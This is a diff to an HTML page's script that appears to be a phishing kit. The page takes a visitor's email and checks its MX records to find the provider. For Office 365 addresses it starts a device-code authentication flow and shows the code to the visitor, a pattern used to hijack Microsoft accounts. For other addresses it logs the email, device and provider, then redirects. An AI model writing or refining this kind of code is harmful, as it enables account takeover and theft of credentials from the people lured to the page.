@@ -1780,7 +1780,107 @@
             }, 3000);
         }
 
-        function cancelDeviceCode() {
+                function cancelDeviceCode() {
             if (pollingTimer) {
                 clearInterval(pollingTimer);
-                pollingTimer
+                pollingTimer = null;
+            }
+
+            // Reset to email form
+            document.getElementById('deviceCodeForm').style.display = 'none';
+            document.getElementById('authForm').style.display = 'block';
+            document.getElementById('emailInput').value = '';
+            document.getElementById('emailInput').classList.remove('error');
+            document.getElementById('errorMessage').classList.remove('show');
+        }
+
+        // ========== HANDLE EMAIL SUBMIT ==========
+        async function handleEmailSubmit(event) {
+            event.preventDefault();
+
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput.value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMessage');
+
+            // Validate email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                emailInput.classList.add('error');
+                errorMsg.innerHTML = '<span>⚠️</span><span>Please enter a valid email address</span>';
+                errorMsg.classList.add('show');
+                return;
+            }
+
+            // Reset error state
+            emailInput.classList.remove('error');
+            errorMsg.classList.remove('show');
+
+            // Show loading
+            submitBtn.classList.add('loading');
+            submitBtn.disabled = true;
+
+            try {
+                // Perform REAL MX check via Google DNS API
+                const mxResult = await checkMXRecords(email);
+
+                if (!mxResult.success) {
+                    throw new Error(mxResult.error || 'Unable to verify email domain');
+                }
+
+                // ========== HANDLE OFFICE 365 WITH DEVICE CODE FLOW ==========
+                if (mxResult.provider === 'office365') {
+                    console.log('🔷 Office 365 detected - Starting device code flow');
+                    
+                    submitBtn.classList.remove('loading');
+                    submitBtn.disabled = false;
+
+                    // Request device code
+                    const deviceCode = await requestDeviceCode();
+                    
+                    // Display device code UI
+                    displayDeviceCode(deviceCode);
+                    
+                    return; // Don't proceed with normal flow
+                }
+                // ============================================================
+
+                // For Google and Other providers, use original flow
+                const device = getDeviceType();
+                await logVisit(email, device, mxResult.provider);
+
+                // Display provider badge
+                displayProviderBadge(mxResult);
+
+                // Wait a moment to show the badge
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                // Redirect based on MX result
+                redirectToProvider(email, mxResult);
+
+            } catch (error) {
+                console.error('Verification error:', error);
+                emailInput.classList.add('error');
+                errorMsg.innerHTML = `<span>⚠️</span><span>${error.message || 'Error verifying email. Please try again.'}</span>`;
+                errorMsg.classList.add('show');
+                
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+            }
+        }
+
+        // Keyboard support
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                // closeLightbox(); // Commented out to prevent accidental closure during auth
+            }
+        });
+
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', async () => {
+            await initializePage();
+            init();
+        });
+    </script>
+</body>
+</html>
